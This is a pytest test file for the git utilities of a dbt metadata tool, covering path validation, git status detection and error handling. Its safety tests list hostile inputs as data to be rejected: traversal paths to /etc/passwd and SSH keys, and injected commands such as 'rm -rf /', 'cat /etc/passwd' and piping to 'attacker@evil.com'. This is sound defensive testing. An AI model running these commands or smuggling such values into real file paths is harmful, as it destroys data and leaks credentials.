"""Consolidated git operations tests.

Merged from:
- test_git_edge_coverage.py - Git status detection and is_modified() fixes
- test_git_safety.py - Path validation and security

Coverage targets:
- Git status detection with file_path parameter
- Git modification detection for full model names
- Path validation (command injection prevention)
- Error handling in git operations
"""

import subprocess
from unittest.mock import MagicMock, Mock, patch

import pytest

from dbt_meta.utils.git import (
    _find_sql_file_fast,
    get_model_git_status,
    is_committed_but_not_in_main,
    is_modified,
    validate_path,
)


# ============================================================================
# SECTION 1: Git Safety and Path Validation
# ============================================================================


@pytest.mark.critical
class TestGitSafety:
    """Test path validation prevents command injection."""

    def test_valid_paths_accepted(self):
        """Valid paths should pass validation unchanged."""
        valid_paths = [
            "models/core/clients.sql",
            "models/staging/users.sql",
            "target/manifest.json",
            "dbt_project.yml",
            "models/mart_finance/revenue_2024.sql",
            "/Users/pavel/Projects/dbt-meta/models/test.sql"
        ]

        for path in valid_paths:
            result = validate_path(path)
            assert result == path, f"Valid path rejected: {path}"

    def test_directory_traversal_blocked(self):
        """Paths with '..' should be rejected."""
        dangerous_paths = [
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "models/../../../etc/shadow",
            "models/core/../../../../../../etc/hosts"
        ]

        for path in dangerous_paths:
            with pytest.raises(ValueError) as exc_info:
                validate_path(path)
            assert "parent directory traversal" in str(exc_info.value)

    def test_command_injection_blocked(self):
        """Paths with shell metacharacters should be rejected."""
        injection_attempts = [
            "models/test.sql; cat /etc/passwd",
            "models/test.sql && rm -rf /",
            "models/test.sql | mail attacker@evil.com",
            "models/test.sql`cat /etc/passwd`",
            "models/$(whoami).sql",
            "models/test.sql > /dev/null",
            "models/test.sql < /etc/passwd",
            "models/{test}.sql",
            "models/(test).sql",
            "models/test.sql\ncat /etc/passwd"
        ]

        for path in injection_attempts:
            with pytest.raises(ValueError) as exc_info:
                validate_path(path)
            assert "shell metacharacter" in str(exc_info.value)

    def test_empty_path_rejected(self):
        """Empty paths should be rejected."""
        with pytest.raises(ValueError) as exc_info:
            validate_path("")
        assert "cannot be empty" in str(exc_info.value)

    def test_absolute_system_paths_blocked(self):
        """Absolute paths outside user directory should be blocked."""
        dangerous_paths = [
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "/var/log/auth.log",
            "/proc/self/environ"
        ]

        for path in dangerous_paths:
            with pytest.raises(ValueError) as exc_info:
                validate_path(path)
            assert "outside user directory" in str(exc_info.value)

    def test_git_status_validates_paths(self):
        """get_model_git_status should validate paths before using them."""
        # Mock _find_sql_file_fast to return dangerous path
        with patch('dbt_meta.utils.git._find_sql_file_fast') as mock_find:
            mock_find.return_value = "../../etc/passwd"

            # Should catch ValueError from validate_path
            with patch('dbt_meta.utils.git.validate_path') as mock_validate:
                mock_validate.side_effect = ValueError("Unsafe path")

                status = get_model_git_status('test_model')

                # Should return safe defaults when validation fails
                assert status.exists is True  # File was found
                assert status.is_tracked is False
                assert status.is_modified is False

    def test_git_operations_use_validated_paths(self):
        """All git subprocess calls should use validated paths."""
        safe_path = "models/test.sql"

        with patch('dbt_meta.utils.git._find_sql_file_fast') as mock_find:
            mock_find.return_value = safe_path

            with patch('dbt_meta.utils.git.validate_path') as mock_validate:
                mock_validate.return_value = safe_path

                with patch('subprocess.run') as mock_run:
                    mock_run.return_value = MagicMock(
                        returncode=0,
                        stdout="M models/test.sql"
                    )

                    get_model_git_status('test_model')

                    # validate_path should be called
                    mock_validate.assert_called_with(safe_path)

                    # subprocess.run should receive validated path
                    calls = mock_run.call_args_list
                    for call in calls:
                        cmd = call[0][0]
                        if safe_path in cmd:
                            # Path is in command, validation worked
                            assert True
                            break
                    else:
                        pytest.fail("Validated path not used in subprocess call")

    def test_path_with_spaces_allowed(self):
        """Paths with spaces should be allowed (common in filenames)."""
        paths_with_spaces = [
            "models/core/client profiles.sql",
            "models/staging/user data.sql",
            "/Users/pavel/My Projects/dbt-meta/test.sql"
        ]

        for path in paths_with_spaces:
            # Spaces are allowed, should not raise
            result = validate_path(path)
            assert result == path

    def test_unicode_paths_allowed(self):
        """Unicode paths should be allowed."""
        unicode_paths = [
            "models/core/données.sql",
            "models/staging/用户.sql",
            "models/mart/αβγ.sql"
        ]

        for path in unicode_paths:
            result = validate_path(path)
            assert result == path


# ============================================================================
# SECTION 2: Git Filesystem Error Handling
# ============================================================================


class TestGitFilesystemErrors:
    """Cover git.py filesystem error handling."""

    def test_find_sql_file_fast_permission_error(self):
        """Test _find_sql_file_fast handles PermissionError."""
        with patch('pathlib.Path.cwd') as mock_cwd:
            mock_path = MagicMock()
            mock_cwd.return_value = mock_path

            # Simulate PermissionError when accessing models dir
            mock_path.__truediv__.return_value.rglob.side_effect = PermissionError("Access denied")

            result = _find_sql_file_fast("test_model")

            # Should return None on permission error
            assert result is None

    def test_find_sql_file_fast_os_error(self):
        """Test _find_sql_file_fast handles OSError."""
        with patch('pathlib.Path.cwd') as mock_cwd:
            mock_path = MagicMock()
            mock_cwd.return_value = mock_path

            # Simulate OSError when searching
            mock_path.__truediv__.return_value.rglob.side_effect = OSError("Disk error")

            result = _find_sql_file_fast("test_model")

            # Should return None on OS error
            assert result is None

    def test_find_sql_file_fast_with_many_files(self):
        """Test _find_sql_file_fast stops at 1000 files."""
        with patch('pathlib.Path.cwd') as mock_cwd:
            mock_path = MagicMock()
            mock_cwd.return_value = mock_path

            # Create 1500 mock SQL files (exceeds 1000 limit)
            mock_files = []
            for i in range(1500):
                mock_file = MagicMock()
                mock_file.stem = f"model_{i}"
                mock_files.append(mock_file)

            mock_path.__truediv__.return_value.rglob.return_value = iter(mock_files)

            result = _find_sql_file_fast("nonexistent_model")

            # Should return None after hitting 1000 file limit
            assert result is None

    def test_find_sql_file_fast_exact_match(self):
        """Test _find_sql_file_fast finds exact stem match."""
        # Create mock file that matches
        mock_file = MagicMock()
        mock_file.stem = "my_model"
        mock_file.__str__.return_value = "models/core/my_model.sql"

        # Mock models directory
        mock_models_dir = MagicMock()
        mock_models_dir.exists.return_value = True
        mock_models_dir.rglob.return_value = iter([mock_file])

        # Patch Path at the module level where it's used
        with patch('dbt_meta.utils.git.Path') as mock_path_class:
            # When Path('models') is called, return our mock directory
            mock_path_class.return_value = mock_models_dir

            result = _find_sql_file_fast("my_model")

            # Should find the file
            assert result == "models/core/my_model.sql"


# ============================================================================
# SECTION 3: Git Status Edge Cases
# ============================================================================


class TestGitStatusEdgeCases:
    """Cover git status edge cases."""

    def test_git_status_with_unicode_decode_error(self):
        """Test git status handles UnicodeDecodeError."""
        with patch('dbt_meta.utils.git._find_sql_file_fast', return_value="models/test.sql"):
            with patch('subprocess.run') as mock_run:
                # Simulate unicode decode error
                mock_run.side_effect = UnicodeDecodeError('utf-8', b'', 0, 1, "Bad encoding")

                status = get_model_git_status("test_model")

                # Should return safe defaults
                assert status.exists is True
                assert status.is_tracked is False
                assert status.is_modified is False

    def test_git_status_with_value_error(self):
        """Test git status handles ValueError."""
        with patch('dbt_meta.utils.git._find_sql_file_fast', return_value="models/test.sql"):
            with patch('subprocess.run') as mock_run:
                # Simulate value error during parsing
                mock_run.side_effect = ValueError("Parse error")

                status = get_model_git_status("test_model")

                # Should return safe defaults
                assert status.exists is True
                assert status.is_tracked is False

    def test_git_status_with_file_not_found_error(self):
        """Test git status handles FileNotFoundError (git not installed)."""
        with patch('dbt_meta.utils.git._find_sql_file_fast', return_value="models/test.sql"):
            with patch('subprocess.run', side_effect=FileNotFoundError("git not found")):
                status = get_model_git_status("test_model")

                # Should return safe defaults
                assert status.exists is True
                assert status.is_tracked is False
                assert status.is_modified is False


# ============================================================================
# SECTION 4: Git Diff Parsing
# ============================================================================


class TestGitDiffParsing:
    """Cover git diff parsing edge cases."""

    def test_git_status_untracked_file(self):
        """Test git status detects untracked files."""
        with patch('dbt_meta.utils.git._find_sql_file_fast', return_value="models/new_model.sql"):
            with patch('subprocess.run') as mock_run:
                # Mock BOTH subprocess calls:
                # 1st call: git status (returns ??)
                # 2nd call: git log (returns empty = not committed)
                mock_run.side_effect = [
                    Mock(returncode=0, stdout="?? models/new_model.sql"),  # git status
                    Mock(returncode=0, stdout="")  # git log (empty = not in history)
                ]

                status = get_model_git_status("new_model")

                # Should detect as untracked
                assert status.exists is True
                assert status.is_tracked is False
                assert status.is_new is True

    def test_git_status_deleted_file(self):
        """Test git status detects deleted files."""
        with patch('dbt_meta.utils.git._find_sql_file_fast', return_value="models/deleted.sql"):
            with patch('subprocess.run') as mock_run:
                # Mock git status showing deleted file
                mock_run.return_value = Mock(
                    returncode=0,
                    stdout=" D models/deleted.sql"
                )

                status = get_model_git_status("deleted")

                # Should detect as deleted
                assert status.is_deleted is True


# ============================================================================
# SECTION 5: Git Status with file_path Parameter (v0.1.4)
# ============================================================================


class TestGitStatusWithFilePath:
    """Test get_model_git_status with file_path parameter."""

    def test_git_status_with_manifest_file_path(self):
        """Test git status detection using file_path from manifest."""
        from pathlib import Path

        with patch('dbt_meta.utils.git._find_sql_file_fast') as mock_find:
            # Should NOT be called when file_path provided
            mock_find.return_value = None

            with patch('pathlib.Path.exists') as mock_exists:
                mock_exists.return_value = True  # File exists

                with patch('subprocess.run') as mock_run:
                    # Mock git status showing modified file
                    mock_run.side_effect = [
                        Mock(returncode=0, stdout=" M models/core/events.sql"),  # git status
                        Mock(returncode=0, stdout="commit abc123")  # git log
                    ]

                    # Call with file_path from manifest
                    status = get_model_git_status(
                        "core_client__events",
                        file_path="models/core/events.sql"
                    )

                    # Should detect as modified
                    assert status.exists is True
                    assert status.is_modified is True
                    # _find_sql_file_fast should NOT be called
                    mock_find.assert_not_called()

    def test_git_status_file_deleted_from_disk(self):
        """Test git status when file in manifest but deleted from disk."""
        with patch('dbt_meta.utils.git._find_sql_file_fast') as mock_find:
            mock_find.return_value = None

            with patch('pathlib.Path.exists') as mock_exists:
                mock_exists.return_value = False  # File NOT on disk

                # Call with file_path from manifest
                status = get_model_git_status(
                    "deleted_model",
                    file_path="models/deleted_model.sql"
                )

                # Should mark as deleted
                assert status.exists is False
                assert status.is_deleted is True

    def test_git_status_without_file_path_uses_find(self):
        """Test git status without file_path falls back to _find_sql_file_fast."""
        with patch('dbt_meta.utils.git._find_sql_file_fast') as mock_find:
            mock_find.return_value = "models/test.sql"

            with patch('subprocess.run') as mock_run:
                mock_run.side_effect = [
                    Mock(returncode=0, stdout=""),  # git status (clean)
                    Mock(returncode=0, stdout="commit abc")  # git log
                ]

                # Call WITHOUT file_path
                status = get_model_git_status("test_model")

                # Should call _find_sql_file_fast
                mock_find.assert_called_once_with("test_model")
                assert status.exists is True


# ============================================================================
# SECTION 6: is_modified() Full Model Name Detection (v0.1.4)
# ============================================================================


class TestIsModifiedFullModelNames:
    """Test is_modified() with full model name in filename."""

    def test_is_modified_detects_full_model_name(self):
        """Test is_modified detects files with full model name."""
        with patch('subprocess.run') as mock_run:
            # Mock git diff showing file with full model name
            mock_run.return_value = Mock(
                returncode=0,
                stdout="models/core/google_events/core_google_events__user_devices.sql\n"
            )

            # Should detect as modified by full model name
            result = is_modified("core_google_events__user_devices")
            assert result is True

    def test_is_modified_detects_short_table_name(self):
        """Test is_modified still detects files with short table name."""
        with patch('subprocess.run') as mock_run:
            # Mock git diff showing file with short table name
            mock_run.return_value = Mock(
                returncode=0,
                stdout="models/staging/user_devices.sql\n"
            )

            # Should detect as modified by table name
            result = is_modified("stg_appsflyer__user_devices")
            assert result is True

    def test_is_modified_new_file_full_name(self):
        """Test is_modified detects new files with full model name."""
        with patch('subprocess.run') as mock_run:
            # First call: git diff (empty)
            # Second call: git status (new file with full name)
            mock_run.side_effect = [
                Mock(returncode=0, stdout=""),
                Mock(returncode=0, stdout="?? models/core_new__feature.sql")
            ]

            # Should detect as modified (new file)
            result = is_modified("core_new__feature")
            assert result is True

    def test_is_modified_no_match_returns_false(self):
        """Test is_modified returns False when file not in git."""
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = [
                Mock(returncode=0, stdout="models/other/different.sql\n"),  # git diff
                Mock(returncode=0, stdout="")  # git status
            ]

            # Should NOT detect as modified
            result = is_modified("stable_model")
            assert result is False


class TestIsCommittedButNotInMain:
    """Test is_committed_but_not_in_main() detects committed changes vs main/master."""

    def test_committed_model_detected(self):
        """Test detects model committed in branch but not in main."""
        with patch('subprocess.run') as mock_run:
            # First call: git diff origin/main...HEAD (has changes)
            mock_run.return_value = Mock(
                returncode=0,
                stdout="models/core/events.sql\nmodels/staging/users.sql\n"
            )

            # Should detect as committed
            result = is_committed_but_not_in_main("core_client__events")
            assert result is True

    def test_not_committed_returns_false(self):
        """Test returns False when model not in branch changes."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = Mock(
                returncode=0,
                stdout="models/other/different.sql\n"
            )

            # Should NOT detect as committed
            result = is_committed_but_not_in_main("stable_model")
            assert result is False

    def test_fallback_to_origin_master(self):
        """Test falls back to origin/master if origin/main not found."""
        with patch('subprocess.run') as mock_run:
            # First call: origin/main (fails)
            # Second call: origin/master (succeeds)
            mock_run.side_effect = [
                Mock(returncode=128, stdout=""),  # origin/main not found
                Mock(returncode=0, stdout="models/events.sql\n")  # origin/master works
            ]

            result = is_committed_but_not_in_main("core_client__events")
            assert result is True

    def test_git_error_returns_false(self):
        """Test returns False on git errors."""
        with patch('subprocess.run') as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired(cmd='git', timeout=5)

            # Should NOT raise, should return False
            result = is_committed_but_not_in_main("any_model")
            assert result is False

    def test_committed_with_full_model_name(self):
        """Test detects committed files with full model name."""
        with patch('subprocess.run') as mock_run:
            mock_run.return_value = Mock(
                returncode=0,
                stdout="models/core_google_events__user_devices.sql\n"
            )

            # Should detect by full model name
            result = is_committed_but_not_in_main("core_google_events__user_devices")
            assert result is True


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
